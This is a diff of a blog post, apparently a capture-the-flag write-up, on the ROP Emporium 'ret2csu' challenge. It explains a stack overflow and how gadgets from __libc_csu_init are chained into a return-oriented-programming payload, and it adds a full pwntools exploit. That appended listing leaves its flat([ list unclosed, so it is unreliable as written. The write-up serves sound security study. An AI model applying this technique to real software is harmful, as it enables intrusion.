@@ -1,3 +1,11 @@
+---
+layout: post
+title:  "Rop Emporium - ret2csu"
+date:   "2023-08-27"
+categories: [pwn, ropemporium]
+usemathjax: false
+---
+
 Here is my write-up for the RopEmporium challenge ret2csu! Another great challenge by the creator of RopEmporium. 
 
 # Recon
@@ -7,7 +15,7 @@ Let's run `checksec` and have a look at the protections on the binary.
 
 This is looking good! We can write to the GOT if needed, we won't have to leak a canary, and PIE is not enabled. We are not, however, allowed to execute shellcode off the stack. 
 
-The challenge description states that like previous RopEmporium challenges, all we have to do is find a way to call the `ret2win()` function with three arguments; `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, and `0xd00df00dd00df00d`. Since this is x86_64, we'll need to populate the `RDI`, `RSI`, and `RDX` registers with the three respective arguments. To do this, we'll need a pop gadget of sorts. That will allow us to pop those arguments we send in off the stack and into those registers. 
+The challenge description states that like previous RopEmporium challenges, all we have to do is find a way to call the `ret2win()` function with three arguments; `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, and `0xd00df00dd00df00d`. Since this is x86_64, we'll need to populate the `RDI`, `RSI`, and `RDX` registers with those three respective arguments. To do this, we'll need a pop gadget of sorts. That will allow us to pop those arguments we send in off the stack and into those registers. 
 
 But we're getting ahead of ourselves. How are we going to redirect execution of this program to where we want it? In `gdb` we can see that the `main()` function is calling the same `pwnme()` function we have seen before. This means that it is probably vulnerable to a buffer overflow. 
 
@@ -19,10 +27,10 @@ We can verify this in `gdb` by attempting to crash the program with a long De Br
 
 Looks like we got a segfault and managed to crash the program! Using `cyclic -l` to lookup the pattern it seems that our offset to the `rip` is 40 bytes. Next, we'll have to find some ROP gadgets to pop our arguments into so we can successfully call `ret2win()` and get our flag! 
 
-However, that is easier said then done. A preliminary look at available ROP gadgets using `ROPGadget` yields nothing to pop into the `rdx` register which prevents us from properly calling `ret2win()`. But wait! The author of this challenge directed us to a (HYPERLINK) Blackhat Asia paper which outlines a new ROP technique. 
+However, that is easier said then done. A preliminary look at available ROP gadgets using `ROPGadget` yields nothing to pop into the `rdx` register which prevents us from properly calling `ret2win()`. But wait! The author of this challenge directed us to a [Blackhat Asia](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) paper which outlines a new ROP technique. 
 
 Basically, even dynamically compiled executables have statically linked components. One such component is the `__libc_csu_init()` function which implements initializers and finalizers in the program. According to a
-[https://katie.cs.mtech.edu/classes/csci305/Schedule/InitFinal_Paper.pdf](paper) I found, initializers assign space in memory and values to objects while finalizes do the opposite; they remove values from memory. That's really not relevant here. What is relevant are the instructions that `__libc_csu_init()` contains. It contains two gadgets that when combined allow us to populate the three registers we need. 
+[paper](https://katie.cs.mtech.edu/classes/csci305/Schedule/InitFinal_Paper.pdf) I found, initializers assign space in memory and values to objects while finalizes do the opposite; they remove values from memory. That's really not relevant here. What is relevant are the instructions that `__libc_csu_init()` contains. It contains two ROP gadgets that when combined allow us to populate the three registers we need. 
 
 By disassembling `__libc_csu_init()` in `gdb`, we can find these gadgets and they are as follows. 
 
@@ -37,7 +45,7 @@ So, what will these allow us to do? Well, we can see that the second gadget move
 # Exploitation
 So, the payload is looking like this... 
 1. 40 bytes to overflow the buffer up the `rip`,
-2. The address of gadget 1 followed by our three arguments and then some junk to satisfy `r12`, `rbp`, and `rbx` (since we don't need them for anything)
+2. The address of gadget 1 followed by our three arguments and then some junk to satisfy `r12`, `rbp`, and `rbx` (since they won't end up being moved anywhere we need)
 3. Our second gadget to move our arguments into the proper registers
 4. And then the address of `ret2win()`!!
 
@@ -52,11 +60,12 @@ p = elf.process()
 offset = 40
 ```
 
-Next we can dig into `gdb` and define the addresses of those gadgets. 
+Next we can dig into `gdb` and define the addresses of those gadgets as well as the address of `ret2win()`. 
 
 ```python
 pop_gadgets = 0x40069a
 mov_gadgets = 0x400680
+ret2win = 0x400510
 ```
 
 And then we can craft our payload and try to send it! 
@@ -87,7 +96,7 @@ After attaching `gdb` to the process and setting a break point, I found there wa
 
 After some googling, I figured out why this is. This instruction requires a pointer to a valid function. In the current payload `rbx` is being filled with 0x0 and `r12` is being filled with 0x2. This would result in a pointer that is not valid and would cause a segfault. How can we get around this? Well, we can find a pointer to a function within the binary that when called won't really do anything. 
 
-One section where we can look for pointers to potentially useful things is in the `.dynamic` section of this ELF executable. This section is present because this program is dynamically linked. The function I used is the `__fini` function and a pointer to it exists in the `.dynamic` section which works out. I can grab the pointer to this function from ghidra. So, the instruction should theoretically end up like this: `call qword ptr [__fini + rbx*8]`. And for this to be accurate we'll want `rbx*8` to be a non factor so we'll just put `0` into the `rbx` so that evaluates to `0`. The modified payload will look like this:
+One section where we can look for pointers to potentially useful things is in the `.dynamic` section of this ELF executable. This section is present because this program is dynamically linked. The function I used is the `__fini` function and a pointer to it exists in the `.dynamic` section which works out. I can grab the pointer to this function from ghidra. So, the instruction should theoretically end up like this: `call qword ptr [__fini + rbx*8]`. And for this to be accurate we'll want `rbx*8` to be a non factor so we'll just put `0` into the `rbx` so that `rbx*8` evaluates to `0`. The modified payload will look like this:
 ```python
 
 fini_pointer = 0x00600e48
@@ -171,4 +180,43 @@ payload = flat([
 ])
 ```
 
-And what do ya know, it works! This was a fun challenge that taught me about a cool ROP technique. 
+And what do ya know, it works! This was a fun challenge that taught me about a cool ROP technique. Below is the full exploit. 
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('ret2csu')
+p = elf.process()
+
+offset = 40
+
+pop_gadgets = 0x40069a
+mov_gadgets = 0x400680
+ret2win = 0x400510
+fini_pointer = 0x00600e48
+pop_rdi = 0x00000000004006a3
+
+payload = flat([
+        offset * 'a',
+        pop_gadgets,
+        0x0,
+        0x1,
+        fini_pointer,
+        0xdeadbeefdeadbeef,
+        0xcafebabecafebabe,
+        0xd00df00dd00df00d,
+        mov_gadgets,
+        0x0, 
+        0x0,
+        0x0,
+        0x0,
+        0x0,
+        0x0,
+        0x0,
+        pop_rdi,
+        0xdeadbeefdeadbeef,
+        ret2win
+
+p.sendline(payload)
+p.interactive()
+```
